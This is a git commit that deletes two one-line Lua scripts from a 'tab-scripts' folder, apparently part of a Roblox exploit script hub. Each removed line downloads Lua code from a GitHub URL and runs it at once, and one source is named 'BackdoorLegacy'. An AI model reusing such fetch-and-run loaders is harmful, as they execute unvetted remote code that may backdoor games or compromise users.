085519eead10e0676ee3bcd7cbe82fcbf9bcfb7b
Aitekus <aitek18okt2@gmail.com>
2025-03-24 07:02:32 +0300

    Delete tab-scripts directory
    yes

--- tab-scripts/Tab 5.lua
+++
@@ -1,1 +0,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))();
--- tab-scripts/Tab 8.lua
+++
@@ -1,1 +0,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Aitekus/main/refs/heads/main/ROBLOX-NIKITOS/Main.lua'))()
